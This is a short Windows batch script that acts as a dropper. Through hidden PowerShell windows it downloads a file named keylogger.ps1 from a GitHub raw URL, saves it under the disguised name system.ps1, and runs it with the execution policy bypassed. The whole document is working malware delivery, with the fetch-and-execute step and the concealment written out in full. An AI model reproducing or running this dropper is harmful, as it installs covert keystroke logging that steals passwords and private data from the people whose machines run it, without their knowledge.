@echo off

cd C:\
mkdir script
cd script

powershell -c powershell.exe -WindowStyle hidden "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/huynh044/KeyLogger/main/keylogger.ps1' -OutFile 'system.ps1'"
start /MIN powershell powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass .\system.ps1



